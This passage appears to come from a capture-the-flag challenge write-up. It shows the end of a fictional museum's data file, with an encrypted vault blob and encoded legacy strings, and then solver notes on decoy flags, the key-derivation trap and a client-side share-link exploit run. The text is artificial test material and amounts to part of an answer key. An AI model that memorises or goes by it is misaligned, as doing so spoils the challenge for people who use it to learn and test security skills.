   "room": "North Hall",
   "sig": "a7d45a6a3c15"
  },
  {
   "accession": "MRD-2022-0140",
   "title": "Afterimage",
   "curator": "C. Iversen",
   "year": 2022,
   "medium": "dye transfer",
   "dims": "71 × 45 cm",
   "note": "loan, not accessioned",
   "blurb": "Retinal afterimage reconstructed from the artist's own sketches.",
   "room": "Salt Room"
  }
 ],
 "vault": {
  "bsalt": "MRD::vault::9f3ac1b7e0",
  "aad": "meridian-vault",
  "blob": {
   "iv": "a2gpIv8Fce9MB8bC",
   "ct": "16VfNalZHTHnm5LdieJJ7GCGp48lV9ndvOvpwV+K9PJvCPBkm3gq5eYP27oMDODW5O5FjHymqzG9Z22k8B1T",
   "tag": "eaJXygDaK/tVfl0Rg5QGFw=="
  }
 },
 "legacy": {
  "banner": "MERIDIAN STAFF — LEGACY CONSOLE (decommissioned 2021)",
  "masked": [
   "ISA1KCcwQS11dCM9IzNFPSQ9MCx1dFZhf2kwIH8rK1QAUwcRFxcMER0bRB0OBV9USlIGBQMNExUPVl0OFUplSRBbSwgwFx0dG1EeVjJUATYKWRUxTlJDLRlCEAIVEw==",
   "OQ0bGkQdDgVfVFAdHxMLCwVOFw1fGhlfXhoHAEMdABhIUwcPHhxDRTsdRA0OC0kaPj07VgoeBABDEVJfVkVbTwgbAw==",
   "QEhfSTYsJkMICElDTwAEGw0aQxdfFx1WQxoUHUINChBYAQ1BWlddV0NARERMQw==",
   "OQ0XSRIIFAJOGh4dTxoKAAYLEUVOSANATklEG0ULTxdCHRsOHgBDRTsdRBsED15JUBMBVgoeBBwCEVVIVldfSQcdRB4bG19TDhMdCE0XBwcQAAwLGlkfHAkfAlRBGAIQVk5WDhpBRAxYHA4AQgEbW1I+Q0tcNEhJEwFPVBQBVVYrThxA",
   "DhAACBAGEx0AGgQaClYGGxMPFwpIGhlVGl8SCl8XTwREFgsEUhIFCgEMRAoEHE5TFhsMFxELQRgGF1NcH1ZJGgUITAcBB1lTHAkXRS4wIDshJzVOSF8XGxwCFw8TThMASkoTQRYaDQENDwwXSAAbCB0LTQoADQEbT05uUhVSCBcJAgQcGkVYWxJUXxoNHA0AAAANEkgXFxcEAxsKBR0IAVQU",
   "HwoHBwAaW04LCkBCT11FRhIbDkVVXFZHUl9EDk4NCgdeGgcPUhwIBAAaRAYHTk5SHwEKVhYPDAtDFVNfFVZJFkQCQgpPQB1KXkhc",
   "PRAQBQ0KQQxPUxwWHFYWGhMHE0VbVA8TTFsRA1lOCxFeEBoIAhECF1IdDAwYTllbHlIcEwBAQT0XBFxcTBNPSQFPWQYKVF8WDwgBER8EAEkGHAgCXhQ="
  ]
 }
};
```

### Notes

- Two decoys are present. The staff-console token `isfcr{l3g4cy_st4ff_c0ns0l3_1s_n0t_th3_v4ult}` is unlocked by setting `features.vault` to true. The console itself states that the token does not open the vault. The Verdigris provenance string hex-decodes to `vfspe{...}`, a scrambled string that is not the flag. The journal calls it "exactly as trustworthy as the certificate beside it".
- Using the full set of gallery records that have a 12-character `sig` as the curator list gives the wrong key. The badge check only tests the length, and the audit set is a strict subset of those records. Only records whose signature verifies under the v3 pepper count.
- The `artifacts/js` copies are needed offline. The vault copies have the file names flattened (`vendor_mcrypto.js`, `assets_js_core.js`, `data_meridian-data.js`). Re-fetch them from the instance if it rotates, and keep the same names so the scripts still load them.
- The gallery files contain non-ASCII text such as the em dash and the multiplication sign. They are kept as they appear in the source so the copies match the instance byte for byte.
- The solve is entirely client-side, so there is no server flag check. The `exploit_link.js` run shows that the share-link path is enough.
